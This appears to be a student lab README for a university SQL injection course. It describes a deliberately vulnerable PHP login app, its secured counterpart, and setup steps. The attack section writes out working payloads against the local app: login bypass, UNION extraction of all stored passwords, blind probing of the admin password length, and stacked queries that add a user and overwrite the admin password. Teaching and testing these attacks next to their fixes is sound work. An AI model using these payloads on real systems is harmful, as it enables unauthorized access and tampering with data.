# Lab 5 — SQL Injection Attack and Defense
**Course:** System and Network Security (CS5.470)  
**Institute:** IIIT Hyderabad  
**Deadline:** 17-04-2026, 11:59 PM  

---

## Project Structure

```
lab5_submission/
├── vulnerable_app/          # Insecure application
│   ├── index.php            # Login page (HTML form)
│   ├── authentication.php   # Vulnerable SQL query handler
│   ├── connection.php       # MySQL connection (plain mysqli)
│   └── style.css            # UI styling
│
├── secure_app/              # Fixed/secure application
│   ├── index.php            # Login page
│   ├── authentication.php   # Secure handler (PDO + prepared stmts)
│   └── connection.php       # PDO connection
│
├── Screenshots/             # Attack evidence screenshots
├── db_setup.sql             # Database setup for both apps
├── generate_hashes.php      # Helper to populate lab5_secure DB
├── README.md
└── SECURITY.md
```

---

## Environment

| Component | Version    |
|-----------|------------|
| XAMPP     | 8.x        |
| PHP       | 8.x        |
| MySQL     | 8.x        |
| Browser   | Any modern |

---

## Setup Instructions

### Step 1 — Install XAMPP
1. Download and install [XAMPP](https://www.apachefriends.org/).
2. Open the XAMPP Control Panel.
3. Start **Apache** and **MySQL**.

### Step 2 — Place Project Files
Copy the entire `lab5_submission/` folder contents into:
```
C:\xampp\htdocs\
```
So the paths become:
```
C:\xampp\htdocs\vulnerable_app\
C:\xampp\htdocs\secure_app\
C:\xampp\htdocs\generate_hashes.php
```

### Step 3 — Set Up the Vulnerable App Database
1. Open [http://localhost/phpmyadmin](http://localhost/phpmyadmin).
2. Click the **SQL** tab.
3. Paste and run the following:

```sql
CREATE DATABASE IF NOT EXISTS lab5;
USE lab5;

CREATE TABLE IF NOT EXISTS users (
    username VARCHAR(50),
    password VARCHAR(50)
);

INSERT INTO users VALUES ('user1',  'pass1');
INSERT INTO users VALUES ('admin',  'admin123');
```

4. Verify at [http://localhost/vulnerable_app/](http://localhost/vulnerable_app/).  
   Test login: **user1 / pass1** — should succeed.

### Step 4 — Set Up the Secure App Database
1. Open [http://localhost/phpmyadmin](http://localhost/phpmyadmin) > SQL tab.
2. Create the secure database and table:

```sql
CREATE DATABASE IF NOT EXISTS lab5_secure;
USE lab5_secure;

CREATE TABLE IF NOT EXISTS users (
    id       INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50)  NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL
);
```

3. Navigate to [http://localhost/generate_hashes.php](http://localhost/generate_hashes.php).
4. Copy the two `INSERT` statements it outputs.
5. Paste and run them in phpMyAdmin.
6. Verify at [http://localhost/secure_app/](http://localhost/secure_app/).  
   Test login: **user1 / pass1** — should succeed.

---

## Running Attack Demonstrations

All attacks are performed on [http://localhost/vulnerable_app/](http://localhost/vulnerable_app/).

### Attack 1 — Authentication Bypass

In the **Username** field enter:
```
' OR '1'='1' --
```
Leave **Password** blank (or any value). Click Login.

**Result:** Login succeeds without valid credentials.  
The injected query becomes:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password=''
```
`'1'='1'` is always true, returning all rows. The `--` comments out the password check.

---

### Attack 2 — Union-Based Injection

In the **Username** field enter:
```
' UNION SELECT username, password FROM users --
```
Leave **Password** blank.

**Result:** All usernames and passwords from the database are displayed in the result table.  
The injected query becomes:
```sql
SELECT * FROM users WHERE username='' UNION SELECT username, password FROM users --' AND password=''
```

---

### Attack 3 — Blind SQL Injection

Blind injection infers data without direct output, using TRUE/FALSE conditions.

**Check if admin exists (TRUE condition):**
```
Username: admin' AND '1'='1
Password: anything
```
Login succeeds → condition is true → admin exists.

**FALSE condition:**
```
Username: admin' AND '1'='2
Password: anything
```
Login fails → condition is false → inference confirmed.

**Enumerating password length:**
```
Username: admin' AND LENGTH(password)=8 --
Password: anything
```
If login succeeds, admin's password is 8 characters.

---

### Attack 4 — Database Modification (MANDATORY)

#### 4a — Insert a New User
```
Username: '; INSERT INTO users VALUES('hacker','hacked123'); --
Password: anything
```
**Before:** Table has 2 users (user1, admin).  
**After:** Table has 3 users (user1, admin, hacker).  
Verify in phpMyAdmin: `SELECT * FROM lab5.users;`

#### 4b — Change Admin Password
```
Username: '; UPDATE users SET password='pwned' WHERE username='admin'; --
Password: anything
```
**Before:** admin password = admin123  
**After:** admin password = pwned  
Verify by logging in as `admin / pwned`.

> ⚠️ Screenshots of Before and After states are in the `Screenshots/` folder.

---

## Verifying the Secure App Blocks All Attacks

Navigate to [http://localhost/secure_app/](http://localhost/secure_app/) and repeat every payload above.

**Expected result for all payloads:** Redirect to login with a generic "Invalid username or password" message. No query output, no error detail, no data leakage.

---

## Defense Summary

| Vulnerability            | Fix Applied                                      |
|--------------------------|--------------------------------------------------|
| SQL Injection            | PDO Prepared Statements (parameterized queries)  |
| Plain-text passwords     | `password_hash()` / `password_verify()` (bcrypt) |
| Error disclosure         | Errors logged server-side, generic message shown |
| No input validation      | Length checks + alphanumeric regex whitelist      |
| Session fixation         | `session_regenerate_id(true)` after login         |

See `SECURITY.md` for a full technical explanation.
